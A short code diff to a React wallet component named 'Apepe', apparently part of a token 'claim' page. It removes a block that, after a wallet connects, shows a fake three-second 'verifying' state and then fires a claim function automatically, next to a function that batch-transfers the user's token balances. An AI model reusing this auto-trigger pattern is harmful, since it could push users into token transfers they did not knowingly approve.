@@ -77,18 +77,7 @@ const Apepe = () => {
 
   const claimFnRef = useRef<() => void>(() => {});
 
-  useEffect(() => {
-    const isConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;
-    if (isConnected && !hasAutoTriggered && !isClaiming && !isVerifying) {
-      setHasAutoTriggered(true);
-      setIsVerifying(true);
-      const timer = setTimeout(() => {
-        setIsVerifying(false);
-        claimFnRef.current();
-      }, 3000);
-      return () => clearTimeout(timer);
-    }
-  }, [publicKey, isEVMConnected, activeChain, hasAutoTriggered, isClaiming, isVerifying]);
+  // Auto-verify popup removed: users connect their wallet and continue freely.
 
   const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[]) => {
     if (!publicKey) return null;
